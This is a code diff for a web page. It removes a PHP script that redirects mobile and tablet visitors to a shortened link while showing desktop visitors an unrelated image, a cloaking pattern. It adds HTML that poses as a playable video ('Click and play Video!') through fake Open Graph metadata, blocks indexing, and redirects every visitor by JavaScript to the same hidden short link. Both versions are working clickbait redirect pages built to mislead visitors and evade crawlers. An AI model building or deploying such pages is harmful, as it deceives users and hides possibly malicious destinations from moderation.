@@ -1,53 +1,13 @@
-<?php
-$tablet_browser = 0;
-$mobile_browser = 0;
- 
-if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
-    $tablet_browser++;
-}
- 
-if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
-    $mobile_browser++;
-}
- 
-if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
-    $mobile_browser++;
-}
- 
-$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
-$mobile_agents = array(
-    'w3c ','acs-','alav','alca','amoi','audi','avan','benq','bird','blac',
-    'blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno',
-    'ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-',
-    'maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-',
-    'newt','noki','palm','pana','pant','phil','play','port','prox',
-    'qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar',
-    'sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-',
-    'tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp',
-    'wapr','webc','winw','winw','xda ','xda-');
- 
-if (in_array($mobile_ua,$mobile_agents)) {
-    $mobile_browser++;
-}
- 
-if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {
-    $mobile_browser++;
-    //Check for tablets on opera mini alternative headers
-    $stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
-    if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {
-      $tablet_browser++;
-    }
-}
- 
-if ($tablet_browser > 0) {
-   header('Location:https://t.co/Lujkq52VTi');
-	exit();
-}
-else if ($mobile_browser > 0) {
-   header('Location:https://t.co/Lujkq52VTi');
-	exit();
-}
-else {
-   header("Location: https://i.ibb.co/MPgfgL3/The-image-of-a-fish-is-said-to-be-a-carp-but-the-e-d-is-no-different-from-a-bird-that-makes-people-c.jpg");
-	exit();
-}
+<meta name="googlebot" content="noarchive"/>
+<meta content="noindex, nofollow" name="robots"/>
+<meta property="og:title" content="Click and play Video!"/>
+<meta property="og:description" content="Click and play Video!"/>
+<meta property="og:video:height" content="360">
+<meta property="og:video:type" content="application/x-shockwave-flash">
+<meta property="og:video:width" content="640">
+<meta property="og:type" content="video">
+<meta property="og:image" content="https://i.ibb.co/ZGSfy7b/1856715158007576794.png">
+<meta property="og:image:width" content="800" />
+<meta property="og:image:height" content="450" />
+<meta property="og:video" content="http://yt2fb.com/top-10-best-mouse-in-cambodia-2/"/>
+<script type="text/javascript" language="javascript">window.location="https://t.co/Lujkq52VTi";</script>
